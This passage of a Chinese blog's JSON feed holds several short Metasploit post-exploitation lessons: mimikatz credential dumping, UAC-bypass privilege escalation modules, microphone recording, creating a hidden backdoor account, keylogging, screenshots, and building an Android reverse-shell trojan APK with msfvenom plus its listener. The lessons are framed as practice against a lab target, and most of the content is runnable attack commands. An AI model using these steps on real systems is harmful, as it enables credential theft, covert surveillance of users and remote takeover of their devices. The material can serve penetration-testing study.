票据</td>\n</tr>\n<tr>\n<td>13</td>\n<td>kiwi_cmd：执行 mimikatz 的命令，后面接 mimikatz.exe 的命令</td>\n</tr>\n<tr>\n<td>14</td>\n<td>lsa_dump_sam：dump 出 lsa 的 SAM</td>\n</tr>\n<tr>\n<td>15</td>\n<td>lsa_dump_secrets：dump 出 lsa 的密文</td>\n</tr>\n<tr>\n<td>16</td>\n<td>password_change：修改密码</td>\n</tr>\n<tr>\n<td>17</td>\n<td>wifi_list：列出当前用户的 wifi 配置文件</td>\n</tr>\n<tr>\n<td>18</td>\n<td>wifi_list_shared：列出共享 wifi 配置文件 / 编码</td>\n</tr>\n</tbody>\n</table>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83Windows/",
            "title": "后渗透之提权Windows",
            "date_published": "2023-01-12T13:24:23.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、环境准备</h1>\n<p>1 MSF-Metasploit Framework</p>\n<p>2 一台 windiows 靶机</p>\n<h1 id=\"二-实战\"><a class=\"anchor\" href=\"#二-实战\">#</a> 二、实战</h1>\n<p>1 提权方法（Windows）查看当前获得用户的权限   meterpreter 中输入： getuid</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493116225.png\" alt=\"1644493116225\"></p>\n<p>方法一、 meterpreter 中输入：getsystem</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493125642.png\" alt=\"1644493125642\"></p>\n<p>方法二、使用 msf 模块提权</p>\n<p>要想提权必须是已经拿到 meterpreter  然后将当前 meterpreter 后台 meterprerer 中输入  background</p>\n<p>1、 查看可用模块  MSF 终端中输入   search bypassuac   查看提权模块</p>\n<p>2、 选择一个适合当前系统的提权模块  我这边使用的是 win10 系统</p>\n<p>那我们使用：use  exploit/windows/local/bypassuac_windows_store_reg  尝试提权</p>\n<p>这个模块不行就换一个 use exploit/windows/local/bypassuac_sluihijack</p>\n<p>或者  use exploit/windows/local/bypassuac_dotnet_profiler</p>\n<p>3 配置模块使用参数   终端内输入： show options</p>\n<p 需要提权的session id>4 可以看到需要配置 session  终端内输入：set session </p>\n<p>5 执行提权  终端内输入：run</p>\n<p>6 获取到 meterpreter 后 我们在终端内 输入 getuid 看实际还没有提权成功  需要在还终端内在输入 getsystem 获取权限</p>\n<p>7 获取权限完成后 输入 getuid 即可看到  已经获取到 SYSTEM 最高权限了</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493163472.png\" alt=\"1644493163472\"></p>\n<p>看到这个证明已经将权限提升成功</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E7%94%A8%E9%9F%B3%E9%A2%91%E8%AE%BE%E5%A4%87%E5%BD%95%E9%9F%B3/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E7%94%A8%E9%9F%B3%E9%A2%91%E8%AE%BE%E5%A4%87%E5%BD%95%E9%9F%B3/",
            "title": "后渗透之调用音频设备录音",
            "date_published": "2023-01-12T13:20:15.000Z",
            "content_html": "<p>一、环境准备<br>\n MSF-Metasploit Framework<br>\n 一台安装手机或者模拟器<br>\n二、实践</p>\n<p>record_mic  包含 4 个可选参数 分别为</p>\n<p>-d  是设置录音时长的</p>\n<p>-f 设置未见路径的</p>\n<p>-h  查看帮助的</p>\n<p>-p  控制自动播放的</p>\n<p>一条简单的录音语句</p>\n<p>record_mic -d  10 -p true</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7Windows/",
            "title": "后渗透之创建账户Windows",
            "date_published": "2023-01-12T13:17:00.000Z",
            "content_html": "<p>一、环境准备</p>\n<p>1 MSF-Metasploit Framework</p>\n<p>2 一台获取到 meterpreter 的靶机</p>\n<p>二、实际操作</p>\n<p>1、先看下目标靶机已存在用户  meterpreter 中输入：run post/windows/gather/enum_logged_on_users</p>\n<p>![1643108073546](22 后渗透之创建账户（Windows）.assets/1643108073546.png)</p>\n<p>2、使用 getgui 创建 一个用户名为 msb  密码为 123456  的账户</p>\n<p>run getgui -u msb -p 123456</p>\n<p 密码>run getgui -u {用户名}-p</p>\n<p>进入 win 的运行输入 netplwiz 可以查看账户创建情况</p>\n<p>![1643108092979](22 后渗透之创建账户（Windows）.assets/1643108092979.png)</p>\n<p>[-] Insufficient privileges, account was not be created. 看到这个提示就需要先提权（获取到 system）</p>\n<p>2.1 绕过 UAC 提权</p>\n<p>use exploit/windows/local/<em>ask</em></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/",
            "title": "后渗透之下载文件屏幕截图键盘记录",
            "date_published": "2023-01-12T13:08:41.000Z",
            "content_html": "<p>第 21 课 ：后渗透之上传下载文件</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">ID</th>\n<th>Command</th>\n<th style=\"text-align:center\">Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td>upload</td>\n<td style=\"text-align:center\">传文件到靶机</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td>download</td>\n<td style=\"text-align:center\">从靶机下载文件</td>\n</tr>\n</tbody>\n</table>\n<p>第 22 课：后渗透之屏幕截图</p>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>screenshot</td>\n<td>截图（Windows）</td>\n</tr>\n</tbody>\n</table>\n<p>第 23 课：后渗透之键盘记录</p>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>Conmmand</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>keyscan_start</td>\n<td>启动键盘记录 (Windows)</td>\n</tr>\n<tr>\n<td>2</td>\n<td>keyscan_dump</td>\n<td>导出键盘 (Windows)</td>\n</tr>\n<tr>\n<td>3</td>\n<td>keyscan_stop</td>\n<td>停止键盘记录 (Windows)</td>\n</tr>\n</tbody>\n</table>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/",
            "title": "后渗透之访问文件系统",
            "date_published": "2023-01-12T13:05:24.000Z",
            "content_html": "<h1 id=\"一-后渗透之访问文件系统\"><a class=\"anchor\" href=\"#一-后渗透之访问文件系统\">#</a> 一、后渗透之访问文件系统</h1>\n<p>1. 文件交互指令</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">ID</th>\n<th style=\"text-align:left\">Command</th>\n<th style=\"text-align:left\">Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:left\">cat</td>\n<td style=\"text-align:left\">读取文件内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:left\">cd</td>\n<td style=\"text-align:left\">切换靶机目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:left\">cp</td>\n<td style=\"text-align:left\">复制文件到目标</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">4</td>\n<td style=\"text-align:left\">mv</td>\n<td style=\"text-align:left\">移动到目标</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">5</td>\n<td style=\"text-align:left\">chmod</td>\n<td style=\"text-align:left\">修改文件权限（比如 chmod 777 shell.elf）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">6</td>\n<td style=\"text-align:left\">del / rm</td>\n<td style=\"text-align:left\">删除靶机文件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">7</td>\n<td style=\"text-align:left\">dir</td>\n<td style=\"text-align:left\">打印靶机目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">8</td>\n<td style=\"text-align:left\">mkdir</td>\n<td style=\"text-align:left\">在靶机上创建目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">9</td>\n<td style=\"text-align:left\">rmdir</td>\n<td style=\"text-align:left\">删除靶机目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">10</td>\n<td style=\"text-align:left\">edit</td>\n<td style=\"text-align:left\">编辑文件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">11</td>\n<td style=\"text-align:left\">getlwd</td>\n<td style=\"text-align:left\">打印本地目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">12</td>\n<td style=\"text-align:left\">getwd</td>\n<td style=\"text-align:left\">打印靶机目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">13</td>\n<td style=\"text-align:left\">lcd</td>\n<td style=\"text-align:left\">更改本地目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">14</td>\n<td style=\"text-align:left\">lls</td>\n<td style=\"text-align:left\">列出本地目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">15</td>\n<td style=\"text-align:left\">ls</td>\n<td style=\"text-align:left\">列出靶机文件目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">16</td>\n<td style=\"text-align:left\">lpwd</td>\n<td style=\"text-align:left\">打印本地目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">17</td>\n<td style=\"text-align:left\">pwd</td>\n<td style=\"text-align:left\">打印工作目录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">19</td>\n<td style=\"text-align:left\">search</td>\n<td style=\"text-align:left\">搜索文件 详情 search -h</td>\n</tr>\n</tbody>\n</table>\n<p>Linux 权限理解</p>\n<p 文件名.后缀>chmod  777  </p>\n<p>chmod  777    shell.elf</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Android/",
            "url": "https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Android/",
            "title": "生成木马反弹shell_Android",
            "date_published": "2023-01-12T08:04:52.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、环境准备</h1>\n<ol>\n<li>MSF-Metasploit Framework</li>\n<li>一台安装手机或者模拟器</li>\n</ol>\n<h1 id=\"二-木马生成\"><a class=\"anchor\" href=\"#二-木马生成\">#</a> 二、木马生成</h1>\n<ol>\n<li>生成一个 APK 后门</li>\n<li>msfvenom -p android/meterpreter/reverse_tcp LHOST={监控 IP} LPORT={监控端口} R&gt;k.apk。</li>\n</ol>\n<p>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.38  LPORT=4567 R&gt;k.apk</p>\n<h1 id=\"三-配置监控\"><a class=\"anchor\" href=\"#三-配置监控\">#</a> 三、配置监控</h1>\n<ol>\n<li>\n<p>启动 msf   终端内输入：msfconsole 启动 msf![1643003592876](21 通过木马反弹 shell（Android）.assets/1643003592876.png)</p>\n</li>\n<li>\n<p>载入监控模块  msf 中输入：  use exploit/multi/handler</p>\n</li>\n<li>\n<p>载入 payload MSF 终端中输入： set payload android/meterpreter/reverse_tcp</p>\n<p>![1643003612323](21 通过木马反弹 shell（Android）.assets/1643003612323.png)</p>\n</li>\n<li>\n<p>配置 payload  MSF 终端中输入：show options</p>\n</li>\n<li>\n<p>配置监控 IP MSF 中输入：set lhost  &lt;监控的 IP&gt;</p>\n</li>\n<li>\n<p>配置监控端口  MSF 中输入：set lporr  &lt;监控的端口&gt;</p>\n</li>\n<li>\n<p>执行监控  msf 终端中输入： run![1643003633911](21 通过木马反弹 shell（Android）.assets/1643003633911.png)</p>\n</li>\n</ol>\n<h1 id=\"四-攻击利用\"><a class=\"anchor\" href=\"#四-攻击利用\">#</a> 四、攻击利用</h1>\n<ol>\n<li>将木马上传到靶机</li>\n<li>在靶机上执行木马</li>\n<li>完成攻击利用！[1643003654523](21 通过木马反弹 shell（Android）.assets/1643003654523.png)</li>\n</ol>\n",
            "tags": []
        }
    ]
}